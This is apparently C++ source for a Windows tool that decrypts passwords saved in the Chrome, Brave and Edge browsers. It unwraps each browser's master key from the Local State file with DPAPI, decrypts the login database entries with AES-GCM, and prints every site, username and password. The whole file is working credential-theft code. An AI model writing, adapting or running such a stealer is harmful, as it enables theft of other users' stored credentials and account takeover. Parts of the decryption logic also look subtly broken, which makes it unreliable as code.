#include "common.h"
#include "FileIO.h"


DATA_BLOB* UnportectMasterKey(std::string MasterString)
{
	// Base64 decode the key
	std::string base64Key = MasterString;
	std::vector<unsigned char> binaryKey;
	DWORD binaryKeySize = 0;

	if (!CryptStringToBinaryA(base64Key.c_str(), 0, CRYPT_STRING_BASE64, NULL, &binaryKeySize, NULL, NULL))
	{
		std::cout << "[1] CryptStringToBinaryA Failed to convert BASE64 private key. \n";
		return nullptr;
	}

	binaryKey.resize(binaryKeySize);
	if (!CryptStringToBinaryA(base64Key.c_str(), 0, CRYPT_STRING_BASE64, binaryKey.data(), &binaryKeySize, NULL, NULL))
	{
		std::cout << "[2] CryptStringToBinaryA Failed to convert BASE64 private key. \n";
		return nullptr;
	}

	// Decrypt the key
	DATA_BLOB in, out;
	in.pbData = binaryKey.data() + 5;
	in.cbData = binaryKeySize - 5;

	if (!CryptUnprotectData(&in, NULL, NULL, NULL, NULL, 0, &out))
	{
		std::cout << "Failed to unprotect master key.\n";
		return nullptr;
	}

	// Allocate memory for the output DATA_BLOB pointer and return it

	DATA_BLOB* outPtr = new DATA_BLOB;
	outPtr->pbData = out.pbData;
	outPtr->cbData = out.cbData;
	return outPtr;
}

std::string ParseMasterString(std::string data)
{
	std::string secret_key;
	size_t idx = data.find("encrypted_key") + 16;
	while (idx < data.length() && data[idx] != '\"')
	{
		secret_key.push_back(data[idx]);
		idx++;
	}

	return secret_key;
}


DATA_BLOB* GetMasterKey(BROWSER browser)
{
	std::string localState = FileIO::GetLocalState(browser);
	std::string localStateData = FileIO::ReadFileToString(localState);
	std::string MasterString = ParseMasterString(localStateData);

	return UnportectMasterKey(MasterString);
}


std::string AESDecrypter(std::string EncryptedBlob, DATA_BLOB MasterKey)
{
	BCRYPT_ALG_HANDLE hAlgorithm = 0;
	BCRYPT_KEY_HANDLE hKey = 0;
	NTSTATUS status = 0;
	SIZE_T EncryptedBlobSize = EncryptedBlob.length();
	SIZE_T TagOffset = EncryptedBlobSize - 15;
	ULONG PlainTextSize = 0;

	std::vector<BYTE> CipherPass(EncryptedBlobSize);
	std::vector<BYTE> PlainText;
	std::vector<BYTE> IV(IV_SIZE);

	// Parse iv and password from the buffer using std::copy
	std::copy(EncryptedBlob.data() + 3, EncryptedBlob.data() + 3 + IV_SIZE, IV.begin());
	std::copy(EncryptedBlob.data() + 15, EncryptedBlob.data() + EncryptedBlobSize, CipherPass.begin());

	// Open algorithm provider for decryption
	status = BCryptOpenAlgorithmProvider(&hAlgorithm, BCRYPT_AES_ALGORITHM, NULL, 0);
	if (!BCRYPT_SUCCESS(status))
	{
		std::cout << "BCryptOpenAlgorithmProvider failed with status: " << status << std::endl;
		return "";
	}

	// Set chaining mode for decryption
	status = BCryptSetProperty(hAlgorithm, BCRYPT_CHAINING_MODE, (UCHAR*)BCRYPT_CHAIN_MODE_GCM, sizeof(BCRYPT_CHAIN_MODE_GCM), 0);
	if (!BCRYPT_SUCCESS(status))
	{
		std::cout << "BCryptSetProperty failed with status: " << status << std::endl;
		BCryptCloseAlgorithmProvider(hAlgorithm, 0);
		return "";
	}

	// Generate symmetric key
	status = BCryptGenerateSymmetricKey(hAlgorithm, &hKey, NULL, 0, MasterKey.pbData, MasterKey.cbData, 0);
	if (!BCRYPT_SUCCESS(status))
	{
		std::cout << "BcryptGenertaeSymmetricKey failed with status: " << status << std::endl;
		BCryptCloseAlgorithmProvider(hAlgorithm, 0);
		return "";
	}

	// Auth cipher mode info
	BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO AuthInfo;
	BCRYPT_INIT_AUTH_MODE_INFO(AuthInfo);
	TagOffset = TagOffset - 16;
	AuthInfo.pbNonce = IV.data();
	AuthInfo.cbNonce = IV_SIZE;
	AuthInfo.pbTag = CipherPass.data() + TagOffset;
	AuthInfo.cbTag = TAG_SIZE;

	// Get size of plaintext buffer
	status = BCryptDecrypt(hKey, CipherPass.data(), TagOffset, &AuthInfo, NULL, 0, NULL, NULL, &PlainTextSize, 0);
	if (!BCRYPT_SUCCESS(status))
	{
		std::cout << "BCryptDecrypt (1) failed with status: " << status << std::endl;
		return "";
	}

	// Allocate memory for the plaintext
	PlainText.resize(PlainTextSize);

	status = BCryptDecrypt(hKey, CipherPass.data(), TagOffset, &AuthInfo, NULL, 0, PlainText.data(), PlainTextSize, &PlainTextSize, 0);
	if (!BCRYPT_SUCCESS(status))
	{
		std::cout << "BCrypt Decrypt (2) failed with status: " << status << std::endl;
		return "";
	}

	// Close the algorithm handle
	BCryptCloseAlgorithmProvider(hAlgorithm, 0);

	return std::string(PlainText.begin(), PlainText.end());
}

void DecryptPasswordFor(BROWSER browser)
{
	std::string DbPath = FileIO::GetDbPath(browser);
	DATA_BLOB* MasterKey = GetMasterKey(browser);

	sqlite3* db = nullptr;
	std::string selectQuery = "SELECT origin_url, action_url, username_value, password_value FROM logins";
	sqlite3_stmt* selectStmt = nullptr;


	// Open the database file
	if (sqlite3_open(DbPath.c_str(), &db) != SQLITE_OK) {
		std::cerr << "Failed to open database file: " << sqlite3_errmsg(db) << std::endl;
		return;
	}

	// Prepare the SELECT statement
	if (sqlite3_prepare_v2(db, selectQuery.c_str(), -1, &selectStmt, 0) != SQLITE_OK) {
		std::cerr << "Failed to prepare SELECT statement: " << sqlite3_errmsg(db) << std::endl;
		return;
	}
	// Iterate over the rows of the logins table
	while (sqlite3_step(selectStmt) == SQLITE_ROW) {
		// Extract the values of the columns
		const char* website = reinterpret_cast<const char*>(sqlite3_column_text(selectStmt, 0));
		const char* loginUrl = reinterpret_cast<const char*>(sqlite3_column_text(selectStmt, 1));
		const char* userName = reinterpret_cast<const char*>(sqlite3_column_text(selectStmt, 2));
		const char* passwordBlob = reinterpret_cast<const char*>(sqlite3_column_blob(selectStmt, 3));
		int passwordBlobSize = sqlite3_column_bytes(selectStmt, 3);

		if (passwordBlobSize > 0) {
			// Decrypt the password
			std::string pass = AESDecrypter(passwordBlob, *MasterKey);
			// Print the login information
			std::cout << "Website: " << website << std::endl;
			std::cout << "Login URL: " << loginUrl << std::endl;
			std::cout << "User name: " << userName << std::endl;
			std::cout << "Password: " << pass << std::endl;
		}
		else {
			// Print a message if the password is empty
			std::cout << "No password found for this login" << std::endl;
		}
	}

	delete MasterKey;
}


int main() {


	std::cout << "CHROME\n\n";	
	DecryptPasswordFor(CHROME);
	std::cout << "\n\nBRAVE\n\n";
	DecryptPasswordFor(BRAVE);
	std::cout << "\n\nEDGE\n\n";
	DecryptPasswordFor(EDGE);

	return 0;
}
